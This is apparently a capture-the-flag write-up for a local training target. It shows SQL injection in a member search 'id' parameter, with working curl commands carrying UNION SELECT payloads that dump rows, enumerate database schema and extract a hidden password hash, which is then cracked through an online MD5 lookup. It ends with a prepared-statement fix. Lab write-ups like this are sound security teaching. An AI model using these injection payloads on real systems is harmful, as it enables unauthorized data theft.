# SQL Injection — Member Search

## Vulnerability

The member search `id` parameter is concatenated directly into a SQL query — OWASP A03:2021 Injection.

## Steps to Reproduce

### 1. Confirm SQLi — dump all rows
```bash
curl -s "http://localhost/?page=member&id=1+OR+1%3D1&Submit=Submit"
```
Returns all users including `Flag / GetThe` — proves input is injected into SQL.

### 2. Find column count with UNION SELECT
```bash
curl -s "http://localhost/?page=member&id=1+UNION+SELECT+1,2&Submit=Submit"
```
Shows `First name: 1`, `Surname: 2` — query returns 2 columns.

### 3. Enumerate tables and columns in current database
```bash
curl -s "http://localhost/?page=member&id=1+UNION+SELECT+table_name,column_name+FROM+information_schema.columns+WHERE+table_schema%3Ddatabase()&Submit=Submit"
```
Reveals `users` table with hidden columns: `Commentaire`, `countersign`.

### 4. Extract hidden columns
```bash
curl -s "http://localhost/?page=member&id=1+UNION+SELECT+Commentaire,countersign+FROM+users&Submit=Submit"
```
Returns:
- `Commentaire: Decrypt this password -> then lower all the char. Sh256 on it and it's good !`
- `Countersign: 5ff9d0165b4f92b14994e5c685cdce28`

### 5. Crack MD5 and compute flag
```bash
# Crack MD5 via rainbow table API (result: FortyTwo)
curl -s "https://www.nitrxgen.net/md5db/5ff9d0165b4f92b14994e5c685cdce28"

# Alternative: use https://crackstation.net or https://hashes.com/en/decrypt/hash
# to look up the hash manually in browser

# Lowercase → SHA-256 = flag
echo -n "fortytwo" | shasum -a 256
```

Automated alternative — run `enumerate.py`:
```bash
python enumerate.py
```

**Flag:** `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

## Why It Works

The `id` parameter is interpolated into a SQL query string without sanitization. UNION injection allows appending arbitrary SELECT statements to read from any table the database user has access to.

## Fix / Mitigation

- Use parameterized queries / prepared statements:
  ```php
  $stmt = $pdo->prepare("SELECT * FROM members WHERE id = ?");
  $stmt->execute([$_GET['id']]);
  ```
- Enforce least-privilege DB user (read-only, limited to the app's tables).
